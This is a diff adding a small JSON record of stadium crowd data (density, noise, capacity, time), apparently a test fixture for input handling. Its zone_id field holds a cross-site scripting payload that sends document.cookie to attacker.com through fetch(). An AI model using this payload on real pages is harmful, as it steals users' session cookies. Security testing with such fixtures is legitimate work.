@@ -1,0 +1,9 @@
+{
+  "zone_id": "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>ZONE-X",
+  "current_crowd_density": 45,
+  "ambient_noise_levels": 70,
+  "incident_flag": false,
+  "local_time": "16:00",
+  "stadium_capacity_limit": 80000,
+  "language_preference": "en"
+}
